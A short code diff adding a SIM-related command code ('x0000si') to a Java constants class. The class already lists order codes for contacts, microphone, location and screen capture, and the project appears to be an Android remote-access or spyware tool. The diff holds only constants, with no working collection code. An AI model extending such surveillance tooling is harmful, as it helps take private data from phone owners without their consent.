@@ -10,6 +10,7 @@ public class Constants {
     public static final String ORDER_CONTACTS = "x0000cn";
     public static final String ORDER_MICROPHONE = "x0000mc";
     public static final String ORDER_LOCATION = "x0000lm";
+    public static final String ORDER_SIM = "x0000si";
 
     // Screen Capture related constants
     public static final int JPEG_COMPRESSION_QUALITY = 20; // 20% compression
